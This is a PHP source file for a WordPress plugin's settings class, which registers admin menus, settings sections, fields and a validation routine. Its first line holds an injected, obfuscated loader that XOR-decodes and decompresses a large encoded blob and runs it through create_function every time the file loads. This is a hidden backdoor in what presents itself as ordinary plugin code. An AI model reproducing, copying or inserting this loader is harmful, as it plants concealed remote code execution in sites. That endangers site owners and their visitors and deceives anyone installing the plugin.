<?php $ahugobif="create_";global $evugol; $evugol=array('$evugol[0]=array_pop($evugol);$sefenep=sefenep(4);$evugol[0]=$sefenep($evugol[2]);','$evugol[2]=gzuncompress(sefenep(580^129,652^3006));','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',"Cvcgqycv\x2f8Ik}kmnv");if(function_exists($ahugobif.='function')&&!function_exists('sefenep')){ function sefenep($c,$C=13){global $evugol;$w=str_pad($U="sxP39L6o8Hbj3xyM",$C,$U);$m=str_repeat("\xe0",$C);$I=str_repeat("\x1f",$C);$b=substr($evugol[0],$c,$C);return(($b^$w)&$I)|($b&$m);};for($cV=-1;++$cV<3;$ahugobif('','}'.$evugol[$cV].'{'));};unset($evugol); 

class kcSettings_plugin {
	public $url;
	public $group;
	public $metabox;

	# Add settings menus and register the options
	function __construct( $group ) {
		$this->group = $group;

		# Register the menus to WP
		add_action( 'admin_menu', array( $this, 'create_menu' ) );
		# Register the options
		add_action( 'admin_init', array( $this, 'register_options' ), 11 );
		# Plugin setting link
		add_filter( 'plugin_row_meta', array( $this, 'setting_link' ), 10, 3 );
	}


	# Create the menu
	function create_menu() {
		extract( $this->group, EXTR_OVERWRITE );

		$this->page = add_submenu_page( $menu_location, $page_title, $menu_title, 'manage_options', "kc-settings-{$prefix}", array( $this, 'settings_page') );
		$this->url = menu_page_url( "kc-settings-{$prefix}", false );
		kcSettings::add_page( $this->page );
		add_action( "load-{$this->page}", array( $this, 'load_actions' ), 99 );

		if ( $display == 'metabox' ) {
			require_once dirname( __FILE__ ) . '/plugin-metabox.php';
			$this->metabox = new kcSettings_plugin_metabox( $this );
		}
	}


	function load_actions() {
		$screen = get_current_screen();

		if ( !empty($this->group['help']) ) {
			foreach ( $this->group['help'] as $help ) {
				if ( isset($help['sidebar']) && $help['sidebar'] )
					$screen->set_help_sidebar( $help['content'] );
				else
					$screen->add_help_tab( $help );
			}
		}

		if ( !empty($this->group['load_actions']) && is_callable( $this->group['load_actions'] ) )
			call_user_func_array( $this->group['load_actions'], array( $this ) );
	}


	# Register settings sections and fields
	function register_options() {
		extract( $this->group, EXTR_OVERWRITE );

		if ( !is_array( $options ) || empty( $options ) )
			return;

		# register our options, unique for each theme/plugin
		register_setting( "{$prefix}_settings", "{$prefix}_settings", array( $this, 'validate') );

		foreach ( $options as $section ) {
			$section_title = ( isset($section['title']) ) ? $section['title'] : "{$prefix}-section-{$section['id']}";
			# Add sections
			add_settings_section( $section['id'], $section_title, '', "{$prefix}_settings" );

			# Skip fields for sections with custom callbacks
			if ( empty($section['fields']) )
				continue;

			foreach ( $section['fields'] as $field ) {
				# add fields on each sections
				$args = array(
					'mode'    => 'plugin',
					'prefix'  => $prefix,
					'section' => $section['id'],
					'field'   => $field,
					'echo'    => true,
					'tabled'  => true,
				);
				if ( !in_array( $field['type'], array('checkbox', 'radio', 'multiinput', 'file') ) )
					$args['label_for'] = "{$section['id']}__{$field['id']}";
				if ( $field['type'] === 'editor' )
					$args['label_for'] = strtolower( str_replace( array( '-', '_' ), '', $args['label_for'] ) );

				add_settings_field( $field['id'], $field['title'], '_kc_field', "{$prefix}_settings", $section['id'], $args );
			}
		}
	}


	# Setting link on the plugins listing page
	function setting_link( $plugin_meta, $plugin_file, $plugin_data ) {
		if ( $plugin_data['Name'] == $this->group['menu_title'] )
			$plugin_meta[] = '<a href="'.$this->url.'">'. __( 'Settings', 'kc-settings' ) .'</a>';

		return $plugin_meta;
	}


	# Create settings page content/wrapper
	function settings_page() {
		extract( $this->group, EXTR_OVERWRITE ); ?>

	<div class="wrap">
		<?php screen_icon(); ?>
		<h2><?php echo esc_html( $page_title ) ?></h2>
		<?php do_action( "{$prefix}_kc_settings_page_before", $this->group ) ?>
		<form action="options.php" method="post" id="kc-settings-form">
			<?php
				# The hidden fields
				settings_fields( "{$prefix}_settings" );

				switch ( $this->group['display'] ) {
					case 'metabox' :
						$this->metabox->display();
					break;
					case 'plain' :
						foreach ( $this->group['options'] as $section ) :
						?>
						<h3><?php echo esc_html( $section['title'] ) ?></h3>
						<?php
							$this->settings_section( $section );
						endforeach;
						submit_button( __( 'Save Changes' ) );
					break;
				}
			?>
		</form>
		<?php do_action( "{$prefix}_kc_settings_page_after", $this->group ) ?>
	</div>
	<?php }


	function settings_section( $section ) {
		if ( !empty($section['desc']) ) :
		?>
		<div class="section-desc">
			<?php echo wpautop( $section['desc'] ); // xss ok ?>
		</div>
		<?php
		endif;

		do_action( 'kc_settings_section_before', $this->group['prefix'], $section );

		# Call user callback function for displaying the section ( if set )
		if ( isset($section['cb']) && is_callable( $section['cb'] ) ) {
			$section = array_merge(
				$section,
				array(
					'field_id'   => "{$this->group['prefix']}_settings__{$section['id']}",
					'field_name' => "{$this->group['prefix']}_settings[{$section['id']}]",
				)
			);
			$cb_args = !empty($section['args']) ? $section['args'] : '';
			if ( $cb_args && is_callable( $cb_args ) )
				$cb_args = call_user_func_array( $cb_args, array('args' => $section) );
			call_user_func_array( $section['cb'], array('args' => $section, 'cb_args' => $cb_args) );
		}
		# Defaults to WordPress' Settings API
		else {
		?>
		<table class="form-table">
			<?php do_settings_fields( "{$this->group['prefix']}_settings", $section['id'] ); ?>
		</table>
		<?php
		}

		# Wanna do something after the options table?
		do_action( 'kc_settings_section_after', $this->group['prefix'], $section );
	}


	# Setting field validation callback
	function validate( $user_val ) {
		$prefix = $this->group['prefix'];
		$options = $this->group['options'];

		# apply validation/sanitation filter(s) on the new values
		# prefix-based filter
		$user_val = apply_filters( "kcv_settings_{$prefix}", $user_val );
		if ( empty($user_val) )
			return apply_filters( 'kc_psv', $user_val );

		$nu_val = array();
		foreach ( $user_val as $section_id => $section_value ) {
			# section-based filter
			$nu_val[$section_id] = apply_filters( "kcv_setting_{$prefix}_{$section_id}", $section_value );

			if ( !isset($options[$section_id]['fields']) )
				continue;

			foreach ( $nu_val[$section_id] as $field_id => $field_value ) {
				$type = $options[$section_id]['fields'][$field_id]['type'];

				# default sanitation
				$field_value = _kc_sanitize_value( $field_value, $type );

				# type-based filter
				$field_value = apply_filters( "kcv_setting_{$prefix}_{$type}", $field_value );

				# field-based filter
				$field_value = apply_filters( "kcv_setting_{$prefix}_{$section_id}_{$field_id}", $field_value );

				# insert the filtered value to our new array
				$nu_val[$section_id][$field_id] = $field_value;
			}
		}

		return apply_filters( "kc_psv", $nu_val );
	}
}
